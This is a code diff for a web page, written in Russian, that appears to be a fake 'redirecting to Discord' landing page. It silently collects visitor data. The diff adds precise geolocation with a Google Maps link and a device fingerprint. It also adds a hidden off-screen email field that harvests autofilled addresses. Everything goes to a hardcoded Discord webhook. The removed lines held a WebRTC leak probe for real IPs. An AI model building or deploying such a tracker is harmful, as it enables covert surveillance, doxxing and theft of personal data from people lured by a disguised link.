@@ -40,7 +40,7 @@
     <div class="container">
         <img class="avatar" src="https://cdn.discordapp.com/embed/avatars/0.png" alt="Avatar">
         <h2>👋 Перенаправляем в Discord...</h2>
-        <p>Анализируем переход...</p>
+        <p>Собираем информацию...</p>
         <div class="spinner"></div>
     </div>
 
@@ -48,14 +48,11 @@
         async function collectAndRedirect() {
             try {
                 // ======================
-                // 1. ПОЛУЧАЕМ IP
+                // 1. IP + ГЕО
                 // ======================
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const { ip } = await ipRes.json();
                 
-                // ======================
-                // 2. ГЕОЛОКАЦИЯ + VPN
-                // ======================
                 let geoData = {};
                 try {
                     const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
@@ -76,11 +73,16 @@
                     if (parts.length > 0) location = parts.join(', ');
                 }
                 
+                let latitude = geoData.latitude || '—';
+                let longitude = geoData.longitude || '—';
+                let mapsLink = (latitude !== '—' && longitude !== '—') ? 
+                    `https://www.google.com/maps?q=${latitude},${longitude}` : '';
+                
                 let vpnStatus = '✅ Обычное соединение';
                 let vpnEmoji = '🟢';
                 if (!geoData.error) {
                     const flags = [];
-                    if (geoData.hosting) flags.push('Хостинг/Дата-центр');
+                    if (geoData.hosting) flags.push('Хостинг');
                     if (geoData.proxy) flags.push('Прокси');
                     if (geoData.vpn) flags.push('VPN');
                     if (geoData.tor) flags.push('Tor');
@@ -88,219 +90,248 @@
                 }
                 
                 // ======================
-                // 3. ОПРЕДЕЛЯЕМ ИСТОЧНИК ПЕРЕХОДА
-                // ======================
-                const referrer = document.referrer;
-                let sourceInfo = '';
-                let sourceEmoji = '';
-                let sourceDetail = '';
-                
-                if (!referrer || referrer === '') {
-                    sourceInfo = '🔗 Прямой переход (ссылку отправили в ЛС/чат)';
-                    sourceEmoji = '💬';
-                    sourceDetail = 'Скорее всего прислали в Discord, Telegram, WhatsApp или скопировали ссылку';
-                } else if (referrer.includes('vk.com')) {
-                    sourceInfo = '🟦 ВКонтакте';
-                    sourceEmoji = '🟦';
-                    sourceDetail = `Полная ссылка: ${referrer}\nВозможно из: ${referrer.includes('/im') ? 'Личные сообщения' : referrer.includes('/wall') ? 'Стена' : referrer.includes('/public') ? 'Группа' : 'Лента/Профиль'}`;
-                } else if (referrer.includes('t.me') || referrer.includes('telegram.org')) {
-                    sourceInfo = '✈️ Telegram';
-                    sourceEmoji = '✈️';
-                    sourceDetail = `Полная ссылка: ${referrer}\n${referrer.includes('/c/') ? 'Из канала' : referrer.includes('/chat/') ? 'Из чата' : 'Из личных сообщений'}`;
-                } else if (referrer.includes('discord.com') || referrer.includes('discordapp.com')) {
-                    sourceInfo = '🎮 Discord';
-                    sourceEmoji = '🎮';
-                    sourceDetail = `Полная ссылка: ${referrer}\n${referrer.includes('/channels/') ? 'С сервера/канала' : 'Из ЛС'}`;
-                } else if (referrer.includes('youtube.com')) {
-                    sourceInfo = '▶️ YouTube';
-                    sourceEmoji = '▶️';
-                    sourceDetail = `Полная ссылка: ${referrer}\nВозможно из комментариев или описания видео`;
-                } else if (referrer.includes('instagram.com')) {
-                    sourceInfo = '📷 Instagram';
-                    sourceEmoji = '📷';
-                    sourceDetail = `Полная ссылка: ${referrer}\nИз профиля/сторис/директ`;
-                } else if (referrer.includes('whatsapp.com')) {
-                    sourceInfo = '💚 WhatsApp';
-                    sourceEmoji = '💚';
-                    sourceDetail = 'Из чата WhatsApp';
-                } else if (referrer.includes('twitter.com') || referrer.includes('x.com')) {
-                    sourceInfo = '🐦 Twitter/X';
-                    sourceEmoji = '🐦';
-                    sourceDetail = `Полная ссылка: ${referrer}`;
-                } else if (referrer.includes('facebook.com')) {
-                    sourceInfo = '👤 Facebook';
-                    sourceEmoji = '👤';
-                    sourceDetail = `Полная ссылка: ${referrer}`;
-                } else if (referrer.includes('google.com') || referrer.includes('google.ru')) {
-                    sourceInfo = '🔍 Google Поиск';
-                    sourceEmoji = '🔍';
-                    sourceDetail = `Полная ссылка: ${referrer}\nЧеловек нашёл ссылку через поиск Google`;
-                } else if (referrer.includes('yandex.ru')) {
-                    sourceInfo = '🔍 Яндекс Поиск';
-                    sourceEmoji = '🔍';
-                    sourceDetail = `Полная ссылка: ${referrer}\nЧеловек нашёл ссылку через поиск Яндекса`;
-                } else {
-                    sourceInfo = '🌐 Другой источник';
-                    sourceEmoji = '🌐';
-                    sourceDetail = `Полная ссылка: ${referrer}`;
-                }
-                
-                // ======================
-                // 4. UTM-МЕТКИ (если есть)
-                // ======================
-                const urlParams = new URLSearchParams(window.location.search);
-                const utmSource = urlParams.get('utm_source');
-                const utmMedium = urlParams.get('utm_medium');
-                const utmCampaign = urlParams.get('utm_campaign');
-                let utmInfo = '';
-                if (utmSource || utmMedium || utmCampaign) {
-                    utmInfo = `🏷️ UTM: источник=${utmSource || 'нет'}, канал=${utmMedium || 'нет'}, кампания=${utmCampaign || 'нет'}`;
-                }
-                
-                // ======================
-                // 5. ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ
+                // 2. УСТРОЙСТВО
                 // ======================
                 const ua = navigator.userAgent;
+                const platform = navigator.platform || '';
+                
+                const phoneModels = {
+                    'iPhone16,2': 'iPhone 15 Pro Max', 'iPhone16,1': 'iPhone 15 Pro',
+                    'iPhone15,5': 'iPhone 15 Plus', 'iPhone15,4': 'iPhone 15',
+                    'iPhone15,3': 'iPhone 14 Pro Max', 'iPhone15,2': 'iPhone 14 Pro',
+                    'iPhone14,7': 'iPhone 14 Plus', 'iPhone14,3': 'iPhone 13 Pro Max',
+                    'iPhone14,2': 'iPhone 13 Pro', 'iPhone13,4': 'iPhone 13 mini',
+                    'SM-S918': 'Samsung Galaxy S23 Ultra', 'SM-S928': 'Samsung Galaxy S24 Ultra',
+                    'SM-S908': 'Samsung Galaxy S22 Ultra', 'SM-F946': 'Samsung Galaxy Z Fold 5',
+                    'Pixel 8 Pro': 'Google Pixel 8 Pro', 'Pixel 7 Pro': 'Google Pixel 7 Pro',
+                    'A065': 'Nothing Phone 2', 'CPH2581': 'OnePlus 12'
+                };
+                
+                let deviceModel = 'Не определена';
+                let deviceBrand = '';
+                
+                if (ua.includes('iPhone') || ua.includes('iPad')) {
+                    const modelMatch = ua.match(/iPhone(\d+,\d+)/) || ua.match(/iPad(\d+,\d+)/);
+                    if (modelMatch) deviceModel = phoneModels[modelMatch[0]] || `Apple ${modelMatch[0]}`;
+                    else deviceModel = ua.includes('iPad') ? 'iPad' : 'iPhone';
+                    deviceBrand = '🍎 Apple';
+                } else if (ua.includes('Android')) {
+                    deviceBrand = '🤖 Android';
+                    let found = false;
+                    for (const [key, value] of Object.entries(phoneModels)) {
+                        if (ua.includes(key)) { deviceModel = value; found = true; break; }
+                    }
+                    if (!found) {
+                        const buildMatch = ua.match(/; ([^;]+) Build/);
+                        deviceModel = buildMatch ? buildMatch[1].trim() : 'Android устройство';
+                    }
+                } else if (ua.includes('Windows')) {
+                    deviceBrand = '💻 Windows ПК';
+                    deviceModel = 'ПК/Ноутбук';
+                } else if (ua.includes('Macintosh') || ua.includes('Mac OS X')) {
+                    deviceBrand = '🍎 Apple';
+                    if (ua.includes('MacBook Pro')) deviceModel = 'MacBook Pro';
+                    else if (ua.includes('MacBook Air')) deviceModel = 'MacBook Air';
+                    else deviceModel = 'Mac';
+                } else if (ua.includes('Linux')) {
+                    deviceBrand = '🐧 Linux';
+                    deviceModel = 'ПК Linux';
+                }
                 
                 let browser = 'Неизвестный';
                 let browserVersion = '';
                 if (ua.includes('Edg/')) { browser = 'Edge'; browserVersion = ua.split('Edg/')[1].split('.')[0]; }
                 else if (ua.includes('Chrome')) { browser = 'Chrome'; browserVersion = ua.split('Chrome/')[1].split('.')[0]; }
                 else if (ua.includes('Firefox')) { browser = 'Firefox'; browserVersion = ua.split('Firefox/')[1].split('.')[0]; }
-                else if (ua.includes('Safari')) { browser = 'Safari'; browserVersion = ua.split('Version/')[1].split('.')[0]; }
+                else if (ua.includes('Safari') && !ua.includes('Chrome')) { browser = 'Safari'; }
                 
                 let os = 'Неизвестная';
                 let osVersion = '';
-                if (ua.includes('Windows NT 10.0')) { os = 'Windows 10/11'; osVersion = '10/11'; }
-                else if (ua.includes('Windows NT 6.3')) { os = 'Windows 8.1'; osVersion = '8.1'; }
+                if (ua.includes('Windows NT 10.0')) { os = 'Windows 10/11'; }
                 else if (ua.includes('Mac OS X')) { os = 'macOS'; const v = ua.match(/Mac OS X (\d+[._]\d+)/); osVersion = v ? v[1].replace('_', '.') : ''; }
-                else if (ua.includes('Linux') && !ua.includes('Android')) { os = 'Linux'; }
                 else if (ua.includes('Android')) { os = 'Android'; const v = ua.match(/Android (\d+\.\d+)/); osVersion = v ? v[1] : ''; }
-                else if (ua.includes('iPhone') || ua.includes('iPad')) { os = 'iOS'; const v = ua.match(/OS (\d+_\d+)/); osVersion = v ? v[1].replace('_', '.') : ''; }
+                else if (ua.includes('iPhone') || ua.includes('iPad')) { os = 'iOS'; }
                 
-                let deviceModel = 'Не определена';
-                if (ua.includes('iPhone')) { deviceModel = 'iPhone'; }
-                else if (ua.includes('iPad')) { deviceModel = 'iPad'; }
-                else if (ua.includes('Android')) { const match = ua.match(/; ([^;]+) Build/); deviceModel = match ? match[1].trim() : 'Android'; }
-                
-                const isMobile = /Mobile|Android|iPhone|iPad/i.test(ua);
+                const isMobile = /Mobile|Android|iPhone/i.test(ua);
                 const isTablet = /iPad|Tablet/i.test(ua);
-                const deviceType = isTablet ? '📱 Планшет' : (isMobile ? '📱 Телефон' : '🖥️ Компьютер');
+                const deviceType = isTablet ? '📱 Планшет' : (isMobile ? '📱 Смартфон' : '🖥️ Компьютер');
                 
                 const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                 const language = navigator.language || 'Неизвестен';
-                const screenRes = `${screen.width}x${screen.height}`;
+                const screenRes = `${screen.width}x${screen.height}@${window.devicePixelRatio}x`;
                 const cpuCores = navigator.hardwareConcurrency || 'Неизвестно';
+                let memory = navigator.deviceMemory ? navigator.deviceMemory + ' ГБ' : 'Неизвестно';
                 
                 // ======================
-                // 6. WEBRTC LEAK
+                // 3. ПОИСК СОЦСЕТЕЙ (косвенные признаки)
                 // ======================
-                let webrtcIPs = [];
-                try {
-                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                    pc.createDataChannel('');
-                    const offer = await pc.createOffer();
-                    await pc.setLocalDescription(offer);
-                    await new Promise((resolve) => {
-                        pc.onicecandidate = (e) => {
-                            if (!e.candidate) { resolve(); return; }
-                            const ipMatch = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-                            if (ipMatch && !webrtcIPs.includes(ipMatch[1])) webrtcIPs.push(ipMatch[1]);
-                        };
-                        setTimeout(resolve, 1000);
-                    });
-                    pc.close();
-                } catch(e) {}
+                
+                // Проверяем реферер
+                const referrer = document.referrer;
+                let sourceInfo = '💬 Прямой переход';
+                let sourceDetail = 'Ссылку прислали в ЛС/чат';
+                
+                if (referrer.includes('vk.com')) {
+                    sourceInfo = '🟦 ВКонтакте';
+                    // Пробуем извлечь ID из ссылки
+                    const vkId = referrer.match(/vk\.com\/([a-zA-Z0-9_.]+)/);
+                    sourceDetail = vkId ? `Профиль/группа: vk.com/${vkId[1]}` : 'ВКонтакте';
+                } else if (referrer.includes('t.me') || referrer.includes('telegram.org')) {
+                    sourceInfo = '✈️ Telegram';
+                    const tgMatch = referrer.match(/t\.me\/([a-zA-Z0-9_]+)/);
+                    sourceDetail = tgMatch ? `Канал/чат: @${tgMatch[1]}` : 'Telegram';
+                } else if (referrer.includes('discord.com')) {
+                    sourceInfo = '🎮 Discord';
+                    const dcMatch = referrer.match(/channels\/(\d+)\/(\d+)/);
+                    sourceDetail = dcMatch ? `Сервер: ${dcMatch[1]}, Канал: ${dcMatch[2]}` : 'Discord';
+                } else if (referrer) {
+                    sourceInfo = '🌐 ' + new URL(referrer).hostname;
+                    sourceDetail = referrer;
+                }
                 
                 // ======================
-                // 7. COOKIES (повторный визит)
+                // 4. ЦИФРОВОЙ ОТПЕЧАТОК (Fingerprint)
                 // ======================
-                let visitCount = 1;
-                let isReturning = false;
+                let fingerprint = '';
                 try {
-                    const stored = localStorage.getItem('visit_count');
-                    if (stored) {
-                        visitCount = parseInt(stored) + 1;
-                        isReturning = true;
+                    const components = [
+                        ua,
+                        language,
+                        timezone,
+                        screenRes,
+                        cpuCores,
+                        platform,
+                        navigator.vendor || '',
+                        navigator.productSub || '',
+                        !!window.sessionStorage,
+                        !!window.indexedDB
+                    ];
+                    fingerprint = btoa(components.join('|')).substring(0, 32);
+                } catch(e) {
+                    fingerprint = 'Ошибка';
+                }
+                
+                // ======================
+                // 5. ПОИСК АККАУНТОВ ПО EMAIL (автозаполнение)
+                // ======================
+                let detectedEmails = [];
+                try {
+                    // Создаём скрытые поля для авто-заполнения
+                    const emailField = document.createElement('input');
+                    emailField.type = 'email';
+                    emailField.name = 'email';
+                    emailField.autocomplete = 'email';
+                    emailField.style.position = 'absolute';
+                    emailField.style.left = '-9999px';
+                    document.body.appendChild(emailField);
+                    
+                    // Ждём автозаполнение
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                    
+                    if (emailField.value && emailField.value.includes('@')) {
+                        detectedEmails.push(emailField.value);
                     }
-                    localStorage.setItem('visit_count', visitCount);
+                    
+                    document.body.removeChild(emailField);
                 } catch(e) {}
                 
                 // ======================
-                // 8. ФОРМИРУЕМ ОТЧЁТ
+                // 6. ОПРЕДЕЛЕНИЕ СЕРВИСОВ ПО EMAIL
+                // ======================
+                let linkedServices = [];
+                if (detectedEmails.length > 0) {
+                    const email = detectedEmails[0].toLowerCase();
+                    if (email.includes('@gmail.com')) linkedServices.push('🔴 Google (Gmail, YouTube)');
+                    if (email.includes('@mail.ru') || email.includes('@bk.ru') || email.includes('@inbox.ru')) linkedServices.push('🟦 Mail.ru (VK, Одноклассники)');
+                    if (email.includes('@yandex.ru')) linkedServices.push('🔍 Яндекс');
+                    if (email.includes('@icloud.com') || email.includes('@me.com')) linkedServices.push('🍎 Apple ID');
+                    if (email.includes('@outlook.com') || email.includes('@hotmail.com')) linkedServices.push('🔵 Microsoft');
+                    if (email.includes('@yahoo.com')) linkedServices.push('🟣 Yahoo');
+                    if (email.includes('@proton.me') || email.includes('@protonmail.com')) linkedServices.push('🔐 ProtonMail');
+                }
+                
+                // ======================
+                // 7. ПОИСК ПО IP (связанные аккаунты)
+                // ======================
+                let ipIntelLink = `https://ipinfo.io/${ip}`;
+                
+                // ======================
+                // 8. ОТПРАВЛЯЕМ
                 // ======================
                 const WEBHOOK = "https://discord.com/api/webhooks/1507909831678496848/6Hm-yFjHzRHElN-GRxDYMc5o3ILiiis_tdMu4GfTiwnScyQCFio5lHr5ou29Y2jVWCgF";
                 
                 const embed = {
-                    title: `${isReturning ? '🔄 ПОВТОРНЫЙ' : '👀 НОВЫЙ'} ПОСЕТИТЕЛЬ!`,
-                    description: `**Визит #${visitCount}** с этого устройства`,
-                    color: isReturning ? 16776960 : 5814786,
+                    title: "👀 НОВЫЙ ПОСЕТИТЕЛЬ!",
+                    description: mapsLink ? `**[🗺️ Google Maps](${mapsLink})** | **[🔍 IP Intel](${ipIntelLink})**` : '',
+                    color: vpnEmoji === '🔴' ? 16711680 : 5814786,
                     fields: [
                         {
-                            name: `━━━━━━ ${sourceEmoji} ИСТОЧНИК ПЕРЕХОДА ━━━━━━`,
-                            value: `${sourceInfo}\n📝 ${sourceDetail}`,
+                            name: "━━━━━━ 📱 УСТРОЙСТВО ━━━━━━",
+                            value: `🏷️ ${deviceBrand}\n📱 ${deviceModel}\n📟 ${deviceType}\n💻 ${os} ${osVersion}\n🌐 ${browser} ${browserVersion}`,
                             inline: false
                         },
                         {
                             name: "━━━━━━ 🌍 ГЕОЛОКАЦИЯ ━━━━━━",
-                            value: `📍 ${location}\n🏢 ${geoData.org || 'Неизвестный провайдер'}\n📮 ${geoData.postal || 'Индекс неизвестен'}\n🔗 IP: ||${ip}||`,
+                            value: `📍 ${location}\n🏢 ${geoData.org || 'Неизвестный провайдер'}\n📮 ${geoData.postal || '—'}\n🔗 IP: ||${ip}||`,
                             inline: false
                         },
                         {
-                            name: "━━━━━━ 🔒 VPN СТАТУС ━━━━━━",
-                            value: `${vpnEmoji} ${vpnStatus}\n🏢 ASN: ${geoData.asn || 'Неизвестно'}`,
+                            name: "━━━━━━ 🎯 КООРДИНАТЫ ━━━━━━",
+                            value: `🌐 ${latitude}, ${longitude}`,
                             inline: false
                         },
                         {
-                            name: "━━━━━━ 🖥️ УСТРОЙСТВО ━━━━━━",
-                            value: `${deviceType}\n📱 Модель: ${deviceModel}\n💻 ОС: ${os} ${osVersion}\n🌐 Браузер: ${browser} ${browserVersion}`,
+                            name: "━━━━━━ 🔒 VPN ━━━━━━",
+                            value: `${vpnEmoji} ${vpnStatus}`,
                             inline: false
                         },
                         {
-                            name: "━━━━━━ ⚙️ ТЕХНИЧЕСКОЕ ━━━━━━",
-                            value: `🖥️ Экран: ${screenRes}\n🧠 CPU: ${cpuCores} ядер\n⏰ Часовой пояс: ${timezone}\n🌍 Язык: ${language}`,
+                            name: "━━━━━━ 📲 ИСТОЧНИК ━━━━━━",
+                            value: `${sourceInfo}\n${sourceDetail}`,
                             inline: false
                         }
                     ],
-                    footer: { text: "Friend Tracker • " + new Date().toLocaleString('ru-RU') },
+                    footer: { text: "Трекер v3.0 • " + new Date().toLocaleString('ru-RU') },
                     timestamp: new Date().toISOString()
                 };
                 
-                // UTM метки
-                if (utmInfo) {
+                // Найденные email
+                if (detectedEmails.length > 0) {
                     embed.fields.push({
-                        name: "━━━━━━ 🏷️ UTM МЕТКИ ━━━━━━",
-                        value: utmInfo,
+                        name: "━━━━━━ 📧 НАЙДЕН EMAIL ━━━━━━",
+                        value: `✉️ ||${detectedEmails[0]}||`,
                         inline: false
                     });
                 }
                 
-                // WebRTC утечки
-                if (webrtcIPs.length > 0) {
-                    const localIPs = webrtcIPs.filter(ip => ip.startsWith('10.') || ip.startsWith('172.16.') || ip.startsWith('192.168.') || ip.startsWith('127.'));
-                    const publicIPs = webrtcIPs.filter(ip => !localIPs.includes(ip));
-                    let webrtcField = '';
-                    if (localIPs.length > 0) webrtcField += `🏠 Локальные: ||${localIPs.join(', ')}||\n`;
-                    if (publicIPs.length > 0) webrtcField += `⚠️ Утечка публичных: ||${publicIPs.join(', ')}||`;
-                    if (webrtcField) {
-                        embed.fields.push({
-                            name: "━━━━━━ 🚨 УТЕЧКА WEBRTC ━━━━━━",
-                            value: webrtcField,
-                            inline: false
-                        });
-                    }
+                // Связанные сервисы
+                if (linkedServices.length > 0) {
+                    embed.fields.push({
+                        name: "━━━━━━ 🔗 СВЯЗАННЫЕ СЕРВИСЫ ━━━━━━",
+                        value: linkedServices.join('\n'),
+                        inline: false
+                    });
                 }
                 
-                // ======================
-                // 9. ОТПРАВЛЯЕМ
-                // ======================
+                // Цифровой отпечаток
+                embed.fields.push({
+                    name: "━━━━━━ 🔑 ЦИФРОВОЙ ОТПЕЧАТОК ━━━━━━",
+                    value: `🆔 \`${fingerprint}\`\nЭтот код уникален для устройства`,
+                    inline: false
+                });
+                
+                // Технические детали
+                embed.fields.push({
+                    name: "━━━━━━ ⚙️ ТЕХНИЧЕСКОЕ ━━━━━━",
+                    value: `🖥️ ${screenRes}\n🧠 ${cpuCores} ядер\n💾 ${memory}\n⏰ ${timezone}\n🌍 ${language}`,
+                    inline: false
+                });
+                
                 await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ embeds: [embed] })
                 });
-                
-                console.log('✅ Отчёт отправлен!');
                 
             } catch(e) {
                 console.log('Ошибка:', e.message);
